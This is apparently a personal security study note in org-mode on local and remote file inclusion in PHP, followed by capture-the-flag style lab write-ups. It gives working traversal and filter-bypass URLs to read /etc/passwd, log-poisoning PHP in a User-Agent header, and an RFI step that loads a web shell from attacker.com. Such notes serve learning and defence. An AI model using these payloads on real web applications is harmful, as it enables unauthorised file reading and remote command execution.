@@ -1,0 +1,200 @@
+#+title: Local File Inclusion (LFI)
+#+author: gabriel
+
+* intro
+Local File Inclusion (LFI) is a security vulnerability that enables attackers to include local files in web applications, allowing them to extract sensitive information from the server.
+
+This vulnerability often occurs due to the lack of validation or insufficient control over file name or path inputs provided by users.
+
+[[./imgs/lfi.png]]
+
+LFI vulnerabilities typically occur in dynamic file inclusion operations, as shown in the example below ->
+#+begin_src php
+<?php
+    $file = $_GET['page'];
+    include($file);
+?>
+#+end_src
+
+In this example, the page parameter is obtained from the user and directly passed to the include function. If the user submits a value like page=../../../../etc/passwd, the server may include the /etc/passwd file.
+
+The ../ expression used in LFI payloads represents the parent directory in Linux systems. For instance, while trying to access the /etc/passwd file, the web application might search for this file within a directory such as /var/www/html/project.
+
+*Linux servers* ->
+: /etc/passwd, /etc/hosts, /var/log/apache2/access.log
+*Windows servers* ->
+: C:\Windows\win.ini, C:\Windows\System32\drivers\etc\hosts
+
+** acessing log files
+: http://example.com/index.php?page=../../../../var/log/apache2/access.log
+
+** php code injection (log poisoning)
+LFI vulnerabilities can allow attackers to execute malicious PHP code. For instance, if a malicious PHP code is added to the web server's access logs, it can be executed using the LFI vulnerability.
+
+Below is an HTTP request with a PHP code injected into the User-Agent field.
+#+begin_src php
+GET /index.php HTTP/1.1
+User-Agent: <?php system('ls'); ?>
+#+end_src
+
+After sending this request, the attacker can view the access.log file from the browser.
+: http://example.com/index.php?page=../../../../var/log/apache2/access.log
+
+In this case, the malicious PHP code is executed on the server, enabling the attacker to list the files in the server's file system.
+
+** REading files with PHP://filter
+PHP's php://filter feature allows applying specific filters while reading file contents. For instance, Base64 encoding a file's content can be useful when direct access to the file is restricted.
+
+*payload* ->
+: php://filter/convert.base64-encode/resource=home.php
+
+: http://example.com/index.php?page=php://filter/convert.base64-encode/resource=home.php
+
+*output* ->
+: PD9waHAKCmVjaG8gImhlbGxvIHdvcmxkIjsKCj8+
+
+*decoding the base64* ->
+: echo 'PD9waHAKCmVjaG8gImhlbGxvIHdvcmxkIjsKCj8+' | base64 -d
+
+* bypass techniques
+Many web applications implement various protection mechanisms against Local File Inclusion (LFI) vulnerabilities. However, these protections are often insufficient and can be bypassed using various techniques.
+
+** path traversal
+Some web applications use simple search-and-replace filters to block path traversal sequences (../). These filters are designed to strip out instances of ../ to prevent directory traversal attacks.
+
+: $language = str_replace('../', '', $_GET['language']);
+
+This code aims to block directory traversal by removing ../ sequences. However, such filters are often inadequate because they typically process the input only once and do not re-filter the output. Therefore, it is possible to bypass the filter by using inputs like ....//.
+
+*bypass method* ->
+: https://example.com/index.php?language=....//....//....//....//etc/passwd
+
+In this way, even though the ../ sequences are stripped out, we can still perform directory traversal. Similarly, other variations such as ..././ or ..../ can be used.
+
+** encoding
+Some web applications use filters that block inputs containing characters related to LFI. However, these filters can be bypassed using URL encoding. URL encoding allows us to encode dangerous characters, which will still be decoded back into the traversal strings.
+
+For instance, if inputs containing . and / characters are blocked, we can URL encode ../ as %2e%2e%2f.
+: https://example.com/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+
+This URL-encoded LFI payload bypasses server-side filters, allowing directory traversal to read the /etc/passwd file.
+
+** approved paths
+Some web applications use regular expressions (regex) to ensure that the included file is within a specified directory.
+
+*example* ->
+#+begin_src php
+if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
+    include($_GET['language']);
+} else {
+    echo 'Invalid path specified!';
+}
+#+end_src
+
+In the above code snippet, the path provided by the user is checked to ensure it starts with . /languages/.
+To bypass this filter, we ensure the input starts with the allowed path and then use ../ to traverse to the root directory:
+: https://example.com/index.php?language=./languages/../../../../etc/passwd
+
+
+** null byte injection
+Some web applications append a certain extension (e.g., .php) to the input filename to restrict file inclusion. However, in older PHP versions, these filters can be bypassed using null byte (%00) injection
+
+*null byte character: %00* ->
+: https://example.com/index.php?language=/etc/passwd%00
+
+This way, the appended .php extension is ignored, allowing the inclusion of the /etc/passwd file.
+
+** double encoding
+In some cases, a single URL encoding is not enough and stronger filters are applied. To bypass such filters, we can use double encoding. Double encoding means encoding the input twice with URL encoding to bypass the filters.
+: https://example.com/index.php?language=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%65%74%63%252f%70%61%73%73%77%64
+
+In this example, %25 represents the % sign, and decoding the double-encoded string allows for directory traversal.
+
+* remote file inclusion (RFI)
+Remote File Inclusion (RFI) is a serious security vulnerability that allows attackers to include files from a remote server, enabling the execution of malicious code.
+
+[[./imgs/rfi.png]]
+
+RFI vulnerabilities occur when web applications use user inputs in file inclusion functions without proper control. This vulnerability allows attackers to include files from a remote server, enabling them to execute malicious code on the target server.
+
+The core concept of RFI attacks is that the web application uses user-provided input as a file path, and this input allows the inclusion of a file from a remote server. For example:
+#+begin_src php
+<?php
+    $file = $_GET['page'];
+    include($file);
+?>
+#+end_src
+
+This code includes the file specified in the page parameter. If a user sends https://example.com/index.php?page=https://<attacker-server>/shell.txt, the application includes and executes the shell.txt file from the remote server.
+
+** differences between LFI and RFI
+*FIle location* ->
+- LFI: Includes local files. The attacker gains access to files on the target server.
+- RFI: Includes remote files. The attacker includes files from a remote server to execute malicious code.
+
+  *attack method* ->
+- LFI: The attacker manipulates file paths on the target server, often targeting server configuration files, password files, or other sensitive information.
+- RFI: The attacker includes files from a remote server, typically to execute malicious code and take control of the target server.
+
+  *requirements* ->
+- LFI: The attacker only needs to know the internal file paths on the server.
+- RFI: PHP configurations such as allow_url_include and allow_url_fopen need to be enabled.
+
+  *protection methods* ->
+- LFI: Strictly validate and filter user inputs, fix file paths, and set permissions correctly.
+- RFI: Disable allow_url_include and allow_url_fopen, strictly validate and filter user inputs.
+
+** basic RFI attack
+Attackers create a malicious file on a remote server and attempt to include this file on the target server. For example, the attacker hosts a web shell at https://<attacker-server>/shell.php:
+
+*shell.php* ->
+#+begin_src php
+<?php system($_GET['cmd']); ?>
+#+end_src
+
+The attacker then sends a request to the target server with the following URL:
+: https://example.com/index.php?page=https://attacker.com/shell.php
+
+This request includes the shell.php file from the remote server and allows the attacker to execute commands.
+
+** malicious code injection
+Attackers can include malicious code from a remote server to be executed on the target server. This method is used to take control of the target server. For example, including a PHP web shell allows the attacker to execute commands.
+
+RFI vulnerabilities can allow attackers to access sensitive files on the target server and steal credentials. For instance, database usernames and passwords stored in a config.php file can be stolen.
+
+* basic local file inclusion
+This lab contains a Local File Inclusion (LFI) vulnerability that leads to unauthorized access to local files within the system.
+
+The content of the 404 error page you see in the web application is fetched from the path in the "page" parameter in the URL. By changing the "page" parameter, you can access other files on the system.
+
+What is the username of the last user added in /etc/passwd?
+
+*solved* ->
+#+begin_src python
+GET /index.php?page=../../../etc/passwd HTTP/1.1
+Host: steady-inertia.europe1.hackviser.space
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+#+end_src
+
+Just another path traversal, path traversal = lfi sometimes ??
+
+* Local file inclusion filter bypass
+This lab contains a Local File Inclusion (LFI) vulnerability that leads to unauthorized access to local files within the system.
+
+The content of the 404 error page you see in the web application is fetched from the path in the "page" parameter in the URL. By changing the "page" parameter, you can access other files on the system.
+
+"/" and ".." are blocked to prevent LFI vulnerability. Find a way to bypass this restriction.
+
+What is the username of the last user added in /etc/passwd?
